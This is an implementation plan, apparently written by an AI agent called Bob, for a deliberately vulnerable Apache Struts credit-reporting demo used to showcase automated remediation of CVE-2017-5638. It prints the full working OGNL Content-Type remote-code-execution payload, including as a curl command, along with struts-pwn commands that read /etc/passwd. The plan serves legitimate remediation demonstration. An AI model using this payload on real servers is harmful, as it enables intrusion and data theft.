# Implementation Plan: CVE-2017-5638 Demo Scenario

## Executive Summary

This document outlines the comprehensive plan to replace the existing vulnerable Python Flask application with a Java-based Apache Struts application vulnerable to CVE-2017-5638 (the same vulnerability exploited in the 2017 Equifax breach). The new demo will showcase a more realistic and impactful vulnerability remediation workflow while maintaining compatibility with the existing Concert + Bob automation.

---

## 1. CVE-2017-5638 Background Research

### 1.1 Vulnerability Overview

**CVE-2017-5638** is a critical Remote Code Execution (RCE) vulnerability in Apache Struts 2 that was exploited in the 2017 Equifax data breach, affecting 147 million people.

#### Technical Details:
- **CVSS Score**: 10.0 (Critical)
- **Vulnerability Type**: Remote Code Execution (RCE)
- **Affected Versions**: Apache Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10
- **Fixed Versions**: 2.3.32, 2.5.10.1
- **Attack Vector**: Malicious Content-Type header in HTTP requests
- **CWE**: CWE-20 (Improper Input Validation)

#### Root Cause:
The vulnerability exists in the Jakarta Multipart parser when processing file uploads. The parser improperly handles the `Content-Type` header, allowing attackers to inject OGNL (Object-Graph Navigation Language) expressions that are evaluated on the server, leading to arbitrary code execution.

#### Exploitation:
```http
POST /upload.action HTTP/1.1
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### 1.2 Equifax Breach Timeline

- **March 2017**: Apache Struts vulnerability (CVE-2017-5638) disclosed
- **March 7, 2017**: Patch released by Apache
- **March 9, 2017**: US-CERT issues alert
- **Mid-May 2017**: Equifax discovers breach (2+ months after patch)
- **July 29, 2017**: Equifax discovers full extent of breach
- **September 7, 2017**: Public disclosure
- **Impact**: 147.9 million consumers affected, $700M+ settlement

### 1.3 Why This CVE is Perfect for Demo

1. **High Impact**: Real-world breach with massive consequences
2. **Well-Documented**: Extensive public information available
3. **Clear Exploitation**: Straightforward attack vector
4. **Testable**: Tools like struts-pwn make testing easy
5. **Educational Value**: Demonstrates importance of timely patching

---

## 2. Application Architecture Design

### 2.1 Credit Application Structure

The demo application will be a simplified credit reporting service with the following components:

```
credit-app/
├── pom.xml                          # Maven configuration
├── src/
│   ├── main/
│   │   ├── java/
│   │   │   └── com/creditapp/demo/
│   │   │       ├── actions/         # Struts Actions
│   │   │       │   ├── CreditCheckAction.java
│   │   │       │   ├── ConsumerDataAction.java
│   │   │       │   ├── DisputeAction.java
│   │   │       │   └── FileUploadAction.java (VULNERABLE)
│   │   │       ├── model/           # Data models
│   │   │       │   ├── Consumer.java
│   │   │       │   ├── CreditReport.java
│   │   │       │   └── Dispute.java
│   │   │       ├── service/         # Business logic
│   │   │       │   ├── CreditService.java
│   │   │       │   └── ConsumerService.java
│   │   │       └── util/            # Utilities
│   │   │           └── DatabaseUtil.java
│   │   ├── resources/
│   │   │   ├── struts.xml           # Struts configuration
│   │   │   ├── log4j2.xml           # Logging config
│   │   │   └── database.properties  # DB config
│   │   └── webapp/
│   │       ├── WEB-INF/
│   │       │   └── web.xml          # Web app config
│   │       ├── index.jsp            # Home page
│   │       ├── credit-check.jsp     # Credit check form
│   │       ├── consumer-data.jsp    # Consumer data view
│   │       └── file-upload.jsp      # File upload (VULNERABLE)
│   └── test/
│       └── java/
│           └── com/creditapp/demo/
│               ├── actions/
│               │   ├── CreditCheckActionTest.java
│               │   ├── ConsumerDataActionTest.java
│               │   └── FileUploadActionTest.java
│               └── service/
│                   ├── CreditServiceTest.java
│                   └── ConsumerServiceTest.java
├── README.md                        # Setup and run instructions
├── EXPLOIT_GUIDE.md                 # How to test the vulnerability
└── docker-compose.yml               # Optional containerization
```

### 2.2 Key Features

#### Realistic Endpoints:
1. **Credit Check Portal** (`/credit-check.action`)
   - Simulates credit report requests
   - Requires SSN, name, DOB
   - Returns mock credit score and history

2. **Consumer Data Portal** (`/consumer-data.action`)
   - View/update consumer information
   - Address, employment, financial data
   - Simulates PII storage

3. **Dispute Management** (`/dispute.action`)
   - File credit report disputes
   - Upload supporting documents
   - Track dispute status

4. **File Upload** (`/upload.action`) **[VULNERABLE]**
   - Document upload functionality
   - Uses vulnerable Struts 2.3.31
   - Exploitable via CVE-2017-5638

#### Database:
- H2 in-memory database for simplicity
- Mock consumer data (147 records to symbolize 147M affected)
- Credit reports, disputes, documents

---

## 3. Technical Implementation Details

### 3.1 Maven Dependencies (pom.xml)

```xml
<dependencies>
    <!-- VULNERABLE: Apache Struts 2.3.31 -->
    <dependency>
        <groupId>org.apache.struts</groupId>
        <artifactId>struts2-core</artifactId>
        <version>2.3.31</version>
    </dependency>
    
    <!-- For file upload vulnerability -->
    <dependency>
        <groupId>org.apache.struts</groupId>
        <artifactId>struts2-convention-plugin</artifactId>
        <version>2.3.31</version>
    </dependency>
    
    <!-- Database -->
    <dependency>
        <groupId>com.h2database</groupId>
        <artifactId>h2</artifactId>
        <version>2.1.214</version>
    </dependency>
    
    <!-- Testing -->
    <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.13.2</version>
        <scope>test</scope>
    </dependency>
    
    <dependency>
        <groupId>org.mockito</groupId>
        <artifactId>mockito-core</artifactId>
        <version>4.11.0</version>
        <scope>test</scope>
    </dependency>
</dependencies>
```

### 3.2 Vulnerable File Upload Action

```java
package com.creditapp.demo.actions;

import com.opensymphony.xwork2.ActionSupport;
import org.apache.struts2.ServletActionContext;
import java.io.File;

/**
 * VULNERABLE: File upload action susceptible to CVE-2017-5638
 * 
 * This action processes file uploads for dispute documentation.
 * The vulnerability exists in the Jakarta Multipart parser's
 * handling of Content-Type headers, allowing OGNL injection.
 */
public class FileUploadAction extends ActionSupport {
    
    private File upload;
    private String uploadContentType;
    private String uploadFileName;
    private String disputeId;
    
    @Override
    public String execute() {
        try {
            // Vulnerable: Struts 2.3.31 processes Content-Type header
            // before this code executes, allowing RCE via OGNL injection
            
            if (upload != null) {
                // Save file logic (never reached during exploit)
                String uploadPath = ServletActionContext.getServletContext()
                    .getRealPath("/") + "uploads/";
                File destFile = new File(uploadPath, uploadFileName);
                upload.renameTo(destFile);
                
                addActionMessage("File uploaded successfully: " + uploadFileName);
                return SUCCESS;
            }
            
            addActionError("No file selected");
            return INPUT;
            
        } catch (Exception e) {
            addActionError("Upload failed: " + e.getMessage());
            return ERROR;
        }
    }
    
    // Getters and setters
    public File getUpload() { return upload; }
    public void setUpload(File upload) { this.upload = upload; }
    
    public String getUploadContentType() { return uploadContentType; }
    public void setUploadContentType(String uploadContentType) { 
        this.uploadContentType = uploadContentType; 
    }
    
    public String getUploadFileName() { return uploadFileName; }
    public void setUploadFileName(String uploadFileName) { 
        this.uploadFileName = uploadFileName; 
    }
    
    public String getDisputeId() { return disputeId; }
    public void setDisputeId(String disputeId) { this.disputeId = disputeId; }
}
```

### 3.3 Unit Tests

```java
package com.creditapp.demo.actions;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.junit.MockitoJUnitRunner;
import java.io.File;
import static org.junit.Assert.*;

@RunWith(MockitoJUnitRunner.class)
public class FileUploadActionTest {
    
    private FileUploadAction action;
    
    @Before
    public void setUp() {
        action = new FileUploadAction();
    }
    
    @Test
    public void testExecuteWithValidFile() throws Exception {
        // Create temporary test file
        File testFile = File.createTempFile("test", ".txt");
        testFile.deleteOnExit();
        
        action.setUpload(testFile);
        action.setUploadFileName("test.txt");
        action.setUploadContentType("text/plain");
        action.setDisputeId("DISP-001");
        
        String result = action.execute();
        assertEquals("SUCCESS", result);
    }
    
    @Test
    public void testExecuteWithNoFile() throws Exception {
        String result = action.execute();
        assertEquals("INPUT", result);
        assertTrue(action.hasActionErrors());
    }
    
    @Test
    public void testCreditCheckAction() {
        CreditCheckAction creditAction = new CreditCheckAction();
        creditAction.setSsn("123-45-6789");
        creditAction.setFirstName("John");
        creditAction.setLastName("Doe");
        
        String result = creditAction.execute();
        assertEquals("SUCCESS", result);
        assertNotNull(creditAction.getCreditScore());
    }
    
    @Test
    public void testConsumerDataRetrieval() {
        ConsumerDataAction consumerAction = new ConsumerDataAction();
        consumerAction.setConsumerId("CONS-001");
        
        String result = consumerAction.execute();
        assertEquals("SUCCESS", result);
        assertNotNull(consumerAction.getConsumer());
    }
}
```

---

## 4. GitHub Actions Workflow Updates

### 4.1 Java Build and Test Configuration

Update `.github/workflows/bob-shell-v2.yml` to support Java:

```yaml
# Add Java setup step
- name: Set up JDK 11
  uses: actions/setup-java@v3
  with:
    java-version: '11'
    distribution: 'temurin'
    cache: maven

# Update test execution
- name: Run unit tests
  id: run-tests
  working-directory: app/credit-app
  run: |
    set +e
    mvn clean test
    TEST_EXIT_CODE=$?
    set -e
    
    if [[ $TEST_EXIT_CODE -eq 0 ]]; then
      echo "tests_passed=true" >> $GITHUB_OUTPUT
    else
      echo "tests_passed=false" >> $GITHUB_OUTPUT
    fi
  continue-on-error: true
```

### 4.2 Maven Dependency Management

The workflow should handle Maven's `pom.xml` for package upgrades:

```yaml
# DevOps phase should update pom.xml
- Update <version>2.3.31</version> to <version>2.3.32</version>
- Verify with: mvn dependency:tree
- Validate with: mvn clean compile
```

---

## 5. False Positive Detection Compatibility

### 5.1 Analysis Patterns for Java/Struts

The false positive detection workflow must be enhanced to support Java:

#### Search Patterns:
```xml
<!-- Search for Struts imports -->
<pattern ecosystem="java">
  import org\.apache\.struts2\..*
</pattern>

<!-- Search for vulnerable file upload usage -->
<pattern ecosystem="java">
  FileUploadAction|ServletFileUpload|MultiPartRequest
</pattern>

<!-- Search for OGNL usage -->
<pattern ecosystem="java">
  OgnlContext|OgnlUtil|ValueStack
</pattern>
```

#### False Positive Scenarios for CVE-2017-5638:

1. **No File Upload Functionality**
   - Struts used but no file upload actions
   - Verdict: FALSE POSITIVE

2. **File Upload Disabled**
   - File upload exists but disabled in struts.xml
   - Verdict: FALSE POSITIVE

3. **Custom Multipart Parser**
   - Application uses custom parser, not Jakarta
   - Verdict: FALSE POSITIVE

4. **Internal-Only Service**
   - Service not exposed to internet
   - Verdict: FALSE POSITIVE (with caveats)

5. **WAF Protection**
   - Web Application Firewall blocks OGNL patterns
   - Verdict: FALSE POSITIVE (with documentation)

### 5.2 True Positive Detection

For CVE-2017-5638, the following indicates TRUE POSITIVE:

```java
// File upload action exists
public class FileUploadAction extends ActionSupport {
    private File upload; // File upload field
    
    public String execute() {
        // Processes file uploads
    }
}
```

```xml
<!-- struts.xml configuration -->
<action name="upload" class="com.creditapp.demo.actions.FileUploadAction">
    <interceptor-ref name="fileUpload"/> <!-- Vulnerable interceptor -->
    <result name="success">/upload-success.jsp</result>
</action>
```

---

## 6. Local Testing and Exploitation

### 6.1 Running the Application Locally

```bash
# Clone repository
git clone https://github.com/your-org/concert-bob-remediate.git
cd concert-bob-remediate
git checkout vuln-java-app

# Navigate to Java app
cd app/credit-app

# Build the application
mvn clean package

# Run with embedded Jetty
mvn jetty:run

# Application will be available at:
# http://localhost:8080/credit-app
```

### 6.2 Testing with struts-pwn

```bash
# Install struts-pwn
git clone https://github.com/mazen160/struts-pwn.git
cd struts-pwn

# Test for vulnerability
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action --check

# Expected output:
# [*] Target URL: http://localhost:8080/credit-app/upload.action
# [+] Target is VULNERABLE to CVE-2017-5638

# Execute command (proof of concept)
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action -c "whoami"

# Expected output:
# [*] Executing command: whoami
# [+] Command output:
# your-username

# More advanced exploitation
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action -c "cat /etc/passwd"
```

### 6.3 Manual Exploitation with cURL

```bash
# Basic RCE test
curl -X POST \
  http://localhost:8080/credit-app/upload.action \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  -F "upload=@test.txt"
```

---

## 7. Documentation Updates

### 7.1 README.md Updates

```markdown
# Concert + Bob Vulnerability Remediation - CVE-2017-5638 Demo

This repository demonstrates an automated CVE remediation workflow using Concert + Bob,
showcasing CVE-2017-5638, the critical vulnerability that was exploited in the 2017 Equifax data breach.

## Demo Application

The demo features a Java-based credit reporting web application built with Apache Struts 2.3.31 (vulnerable version).

### Vulnerable Components:
- **Apache Struts**: 2.3.31 (CVE-2017-5638)
- **Vulnerability Type**: Remote Code Execution (RCE)
- **CVSS Score**: 10.0 (Critical)
- **Attack Vector**: Malicious Content-Type header in file upload requests

### Application Features:
1. Credit Check Portal - Request credit reports
2. Consumer Data Management - View/update consumer information
3. Dispute Management - File and track credit disputes
4. **File Upload** - Document upload (VULNERABLE to CVE-2017-5638)

## Quick Start

### Prerequisites:
- Java 11 or higher
- Maven 3.6+
- Git

### Running the Vulnerable Application:

```bash
cd app/credit-app
mvn clean package
mvn jetty:run
```

Access at: http://localhost:8080/credit-app

### Testing the Vulnerability:

```bash
# Using struts-pwn
git clone https://github.com/mazen160/struts-pwn.git
cd struts-pwn
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action --check
```

## Workflow Overview

[Keep existing workflow diagram and description]

## False Positive Detection

The workflow includes intelligent false positive detection for Java/Maven projects:

- Analyzes `pom.xml` for vulnerable dependencies
- Searches Java source code for Struts usage patterns
- Detects if file upload functionality is actually used
- Evaluates deployment context and security controls

[Rest of README continues...]
```

### 7.2 EXPLOIT_GUIDE.md

Create comprehensive exploitation guide:

```markdown
# CVE-2017-5638 Exploitation Guide

## Understanding the Vulnerability

CVE-2017-5638 is a Remote Code Execution vulnerability in Apache Struts 2
that allows attackers to execute arbitrary commands on the server by sending
a crafted Content-Type header in HTTP requests.

[Detailed technical explanation...]

## Exploitation Methods

### Method 1: Using struts-pwn (Recommended)
[Step-by-step instructions...]

### Method 2: Manual cURL Exploitation
[cURL commands and examples...]

### Method 3: Metasploit Module
[Metasploit usage...]

## Remediation

### Immediate Actions:
1. Upgrade Apache Struts to 2.3.32 or 2.5.10.1+
2. Implement WAF rules to block OGNL patterns
3. Review logs for exploitation attempts

### Long-term Solutions:
[Security best practices...]
```

---

## 8. Implementation Timeline

### Phase 1: Setup and Infrastructure (Days 1-2)
- [x] Create `vuln-java-app` branch
- [ ] Set up Maven project structure
- [ ] Configure build system
- [ ] Set up H2 database schema

### Phase 2: Core Application Development (Days 3-5)
- [ ] Implement Struts actions (Credit, Consumer, Dispute)
- [ ] Create JSP views
- [ ] Implement vulnerable FileUploadAction
- [ ] Add mock data generation

### Phase 3: Testing Infrastructure (Days 6-7)
- [ ] Write unit tests for all actions
- [ ] Create integration tests
- [ ] Add exploitation test scripts
- [ ] Verify struts-pwn compatibility

### Phase 4: Workflow Integration (Days 8-9)
- [ ] Update GitHub Actions for Java/Maven
- [ ] Enhance false positive detection for Java
- [ ] Test complete remediation workflow
- [ ] Verify Concert API integration

### Phase 5: Documentation (Day 10)
- [ ] Update README.md
- [ ] Create EXPLOIT_GUIDE.md
- [ ] Write setup instructions
- [ ] Create demo video/screenshots

### Phase 6: Testing and Validation (Days 11-12)
- [ ] End-to-end workflow testing
- [ ] False positive scenario testing
- [ ] True positive remediation testing
- [ ] Performance and stability testing

---

## 9. Success Criteria

### Functional Requirements:
- ✅ Java application runs successfully on localhost
- ✅ Vulnerable to CVE-2017-5638 (verified with struts-pwn)
- ✅ All unit tests pass
- ✅ GitHub Actions workflow builds and tests Java app
- ✅ False positive detection works for Java/Maven
- ✅ True positive remediation upgrades Struts version
- ✅ Tests fail after upgrade (breaking changes)
- ✅ Bob fixes code to work with new Struts version
- ✅ All tests pass after remediation

### Documentation Requirements:
- ✅ Clear setup instructions
- ✅ Exploitation guide with examples
- ✅ Updated README with Java scenario
- ✅ Architecture documentation
- ✅ Troubleshooting guide

### Quality Requirements:
- ✅ Code follows Java best practices
- ✅ Comprehensive test coverage (>80%)
- ✅ Clear comments explaining vulnerabilities
- ✅ Realistic credit reporting features
- ✅ Professional documentation

---

## 10. Risk Mitigation

### Potential Challenges:

1. **Struts Version Compatibility**
   - Risk: Newer Struts versions may have breaking changes
   - Mitigation: Test upgrade path thoroughly, document breaking changes

2. **False Positive Detection Complexity**
   - Risk: Java/Maven analysis more complex than Python
   - Mitigation: Start with simple patterns, iterate based on testing

3. **Exploitation Tool Compatibility**
   - Risk: struts-pwn may not work with specific configurations
   - Mitigation: Test multiple exploitation methods, provide alternatives

4. **GitHub Actions Java Support**
   - Risk: Maven caching and build times
   - Mitigation: Optimize build configuration, use GitHub Actions cache

5. **Demo Realism vs Simplicity**
   - Risk: Too complex = hard to understand, too simple = not realistic
   - Mitigation: Balance features, focus on key vulnerability demonstration

---

## 11. Next Steps

After reviewing this plan, please confirm:

1. **Scope Approval**: Does this plan meet your requirements?
2. **Timeline**: Is 12 days acceptable for implementation?
3. **Features**: Any additional credit app features needed?
4. **Testing**: Any specific exploitation scenarios to include?
5. **Documentation**: Any additional documentation requirements?

Once approved, I'll proceed with implementation starting with Phase 1.

---

## Appendix A: File Structure

```
app/credit-app/
├── pom.xml
├── README.md
├── EXPLOIT_GUIDE.md
├── src/
│   ├── main/
│   │   ├── java/com/creditapp/demo/
│   │   │   ├── actions/
│   │   │   │   ├── CreditCheckAction.java
│   │   │   │   ├── ConsumerDataAction.java
│   │   │   │   ├── DisputeAction.java
│   │   │   │   └── FileUploadAction.java (VULNERABLE)
│   │   │   ├── model/
│   │   │   │   ├── Consumer.java
│   │   │   │   ├── CreditReport.java
│   │   │   │   └── Dispute.java
│   │   │   ├── service/
│   │   │   │   ├── CreditService.java
│   │   │   │   └── ConsumerService.java
│   │   │   └── util/
│   │   │       └── DatabaseUtil.java
│   │   ├── resources/
│   │   │   ├── struts.xml
│   │   │   ├── log4j2.xml
│   │   │   └── database.properties
│   │   └── webapp/
│   │       ├── WEB-INF/web.xml
│   │       ├── index.jsp
│   │       ├── credit-check.jsp
│   │       ├── consumer-data.jsp
│   │       ├── dispute.jsp
│   │       └── file-upload.jsp
│   └── test/
│       └── java/com/creditapp/demo/
│           ├── actions/
│           │   ├── CreditCheckActionTest.java
│           │   ├── ConsumerDataActionTest.java
│           │   ├── DisputeActionTest.java
│           │   └── FileUploadActionTest.java
│           └── service/
│               ├── CreditServiceTest.java
│               └── ConsumerServiceTest.java
└── docker-compose.yml (optional)
```

## Appendix B: Key Dependencies

```xml
<!-- Vulnerable version -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.3.31</version>
</dependency>

<!-- Fixed version (for remediation) -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.3.32</version>
</dependency>
```

## Appendix C: References

- [CVE-2017-5638 NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
- [Apache Struts Security Bulletin S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)
- [Equifax Data Breach Report](https://www.equifaxsecurity2017.com/)
- [struts-pwn Tool](https://github.com/mazen160/struts-pwn)
- [Black Duck CVE Analysis](https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html)

---

**Document Version**: 1.0  
**Created**: 2026-06-09  
**Author**: Bob (Plan Mode)  
**Status**: Awaiting Approval